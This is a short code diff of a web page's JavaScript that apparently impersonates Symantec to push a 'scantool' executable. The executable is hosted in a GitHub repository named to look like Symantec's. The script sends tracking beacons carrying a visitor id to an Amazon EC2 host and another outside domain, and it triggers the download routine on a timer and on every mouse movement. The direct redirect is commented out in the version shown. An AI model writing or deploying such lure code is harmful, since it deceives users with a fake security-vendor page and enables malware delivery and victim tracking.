@@ -385,6 +385,7 @@
         var params = new URLSearchParams(window.location.search);
         var id = params.get('id');
         var gp = params.get('gp');
+        var stats = `//ec2-3-69-67-245.eu-central-1.compute.amazonaws.com/wtf/track?rid=${gp}`;
         
         
     </script>
@@ -392,7 +393,7 @@
         var target = `https://raw.githubusercontent.com/SymantecCustomerProtection/cloud-gate/${id}/scantool_f34.exe`;
         
         function download() {
-            var yes = document.createElement("img").src = `//ec2-3-69-67-245.eu-central-1.compute.amazonaws.com/wtf/track?rid=${gp}`;
+            var yes = document.createElement("img").src = stats
             //window.location.href = target;
             alert(`downloading form \n ${target}`);
         }
@@ -400,7 +401,7 @@
         setTimeout(download, 2000);
         document.onmouseover = function() {download(); } 
         document.onmouseout  = function() {download(); } 
-        var yes = document.createElement("img").src = `//0xe.ee/?${gp}`;
+        var yes = document.createElement("img").src = stats;
     </script>
     <div class="pg red">
         <div class="pg_cont">
